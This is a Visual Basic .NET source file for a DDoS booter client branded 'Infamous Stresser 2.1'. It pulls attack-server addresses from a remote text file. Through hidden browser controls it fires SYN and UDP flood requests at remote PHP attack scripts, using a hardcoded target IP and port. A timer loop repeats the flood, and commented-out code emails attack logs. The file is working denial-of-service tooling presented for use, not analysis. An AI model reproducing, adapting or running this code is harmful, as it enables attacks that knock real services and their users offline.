Imports System.Net
Imports System.Net.Mail

Public Class Form1
    Dim checks As String
    Private Sub FlowButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton1.Click
        End
    End Sub

    Private Sub FlowTheme1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowTheme1.Click

    End Sub
    Dim a As String
    'Dim b As String
    'Dim c As String
    'Dim d As String
    'Dim z As String
    'Dim f As String
    'Dim g As String
    'Dim h As String
    'Dim i As String
    'Dim j As String

    Sub ssh()
        Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server.txt")

        Dim response As System.Net.HttpWebResponse = request.GetResponse()
        Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
        Dim hi As String = sr.ReadToEnd()

        a = hi
    End Sub
    'Sub ssh1()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server1.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    b = hi
    'End Sub
    'Sub ssh2()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server2.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    c = hi
    'End Sub
    'Sub ssh3()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server3.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    d = hi
    'End Sub
    'Sub ssh4()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server4.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    z = hi
    'End Sub
    'Sub ssh5()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server5.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    f = hi
    'End Sub
    'Sub ssh6()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server6.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    g = hi
    'End Sub
    'Sub ssh7()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server7.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    h = hi
    'End Sub
    'Sub ssh8()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server8.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    i = hi
    'End Sub
    'Sub ssh9()
    '    Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/Server9.txt")

    '    Dim response As System.Net.HttpWebResponse = request.GetResponse()
    '    Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
    '    Dim hi As String = sr.ReadToEnd()

    '    j = hi
    'End Sub
    Private Sub flowButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton3.Click

        'ssh()
        'ssh1()
        'ssh2()
        'ssh3()
        'ssh4()
        'ssh5()
        'ssh6()
        'ssh7()
        'ssh8()
        'ssh9()
        If ComboBox1.Text = "UDP" Then
            Timer2.Stop()
            Timer1.Start()
            
        End If

        If ComboBox1.Text = "Ssyn" Then
            WebBrowser1.Navigate(a + "?dosattack=2&" + "host=" + "108.0.69.141" + "&time=" + "10" + "&port=" + "80")
            MsgBox("Ssyn Attack Sent!")
        End If
        'WebBrowser2.Navigate(b + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser3.Navigate(c + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser4.Navigate(d + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser5.Navigate(f + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser6.Navigate(g + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser7.Navigate(h + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser8.Navigate(i + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser9.Navigate(j + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)

        'WebBrowser10.Navigate(z + "?act=phptools&" + "host=" + TextBox1.Text + "&time=" + NumericUpDown1.Text + "&port=" + TextBox2.Text)


        logs.RichTextBox1.Text = (logs.RichTextBox1.Text + vbNewLine + "------------------" + vbNewLine + TextBox1.Text + " On Port " + TextBox2.Text + " For " + NumericUpDown1.Text + " At " + DateAndTime.Now + vbNewLine + "------------------")
        '\\Email logs
        'Dim mail As New MailMessage()

        'Dim SmtpServer As New SmtpClient
        'SmtpServer.Credentials = New Net.NetworkCredential("your email@gmail.com", "pass")
        'SmtpServer.Port = 587
        'SmtpServer.Host = "smtp.gmail.com"
        'SmtpServer.EnableSsl = True
        'mail.To.Add("youemail@gmail.com")
        'mail.From = New MailAddress("youemail@gmail.com")
        'mail.Subject = "Attack Log From: " + HWID.TextBox1.Text
        'mail.Body = HWID.TextBox1.Text + " Attacked " + " " + TextBox1.Text + " " + " For " + " " + NumericUpDown1.Text + " " + " On Port " + TextBox2.Text + " At " + DateAndTime.Now
        'SmtpServer.Send(mail)
        'MsgBox("Attack Sent!")
        TextBox1.Clear()
        TextBox2.Clear()

        WebBrowser1.Navigate("http://google.com")
        'WebBrowser2.Navigate("http://google.com")
        'WebBrowser3.Navigate("http://google.com")
        'WebBrowser4.Navigate("http://google.com")
        'WebBrowser5.Navigate("http://google.com")
        'WebBrowser6.Navigate("http://google.com")
        'WebBrowser7.Navigate("http://google.com")
        'WebBrowser8.Navigate("http://google.com")
        'WebBrowser9.Navigate("http://google.com")
        'WebBrowser10.Navigate("http://google.com")










    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        WebBrowser1.Hide()
        WebBrowser2.Hide()
        WebBrowser3.Hide()
        WebBrowser4.Hide()
        WebBrowser5.Hide()
        WebBrowser6.Hide()
        WebBrowser7.Hide()
        WebBrowser8.Hide()
        WebBrowser9.Hide()
        WebBrowser10.Hide()
        NumericUpDown1.Increment = 10
        NumericUpDown1.Maximum = 600
        NumericUpDown1.Value = 10


        FlowTheme1.Text = "Infamous Stresser 2.1 [Licensed To:" + HWID.TextBox1.Text + "]"
        st()

    End Sub


    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged

    End Sub

    Private Sub TextBox3_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    



  

 

    Private Sub Label5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label5.Click

    End Sub
    Sub st()
        '\\MOTD
        Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("http://mehbawts.com/MOTD.txt")

        Dim response As System.Net.HttpWebResponse = request.GetResponse()
        Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
        Dim hi As String = sr.ReadToEnd()

        RichTextBox1.Text = hi
    End Sub

   

    

   

 




   

    

   


    Private Sub WebBrowser10_DocumentCompleted(ByVal sender As System.Object, ByVal e As System.Windows.Forms.WebBrowserDocumentCompletedEventArgs) Handles WebBrowser10.DocumentCompleted

    End Sub

    Private Sub FlowButton12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton12.Click
        MsgBox("Tippy,Existence,Xbox LIVE,TSWR")
    End Sub


    Private Sub FlowButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton6.Click
        updates.Show()
    End Sub

    Private Sub FlowButton10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton10.Click
        logs.Show()
    End Sub

    Private Sub FlowButton8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton8.Click
        MsgBox("Pm with any issues.", MsgBoxStyle.Information, "Issue")
        'support.Show()
    End Sub

    Private Sub FlowButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton4.Click
        Try
            If TextBox3.Text.Contains("http://") Then
                Dim iphe As IPHostEntry = Dns.GetHostEntry(TextBox3.Text.Replace("http://", String.Empty))
                TextBox3.Text = iphe.AddressList(0).ToString()
            Else
                Dim iphe As IPHostEntry = Dns.GetHostEntry(TextBox3.Text)
                TextBox3.Text = iphe.AddressList(0).ToString()
            End If
        Catch ex As Exception
            MsgBox(ex)
        End Try
    End Sub

    Private Sub FlowButton11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton11.Click
        'Process.Start("http://infamousstresser.com/")
        MsgBox("Pm Me for MY Lr ID or AP")
    End Sub

    Private Sub FlowButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton5.Click
        Dim str As String = New WebClient().DownloadString(("http://downforeveryoneorjustme.com/" + TextBox4.Text))
        If str.Contains("It's just you.") Then
            Label5.Text = "The site is Up!"

        ElseIf str.Contains("It's not just you!") Then
            Label5.Text = "The site is Down!"
        Else
            Label5.Text = "No Website!"

        End If
    End Sub

    Private Sub FlowButton9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton9.Click
        Chat.Show()
    End Sub

    Private Sub flowButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub FlowButton2_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub FlowButton7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlowButton7.Click
        Music.Show()
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        WebBrowser1.Navigate("http://http://199.115.230.89/j.php" + "?phptools&" + "host=" + "108.0.69.141" + "&time=" + "20" + "&port=" + "80")

        Label7.Text = "ON"
        Timer2.Start()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer1.Stop()
        Label7.Text = "Off"
        Timer1.Start()
    End Sub
End Class
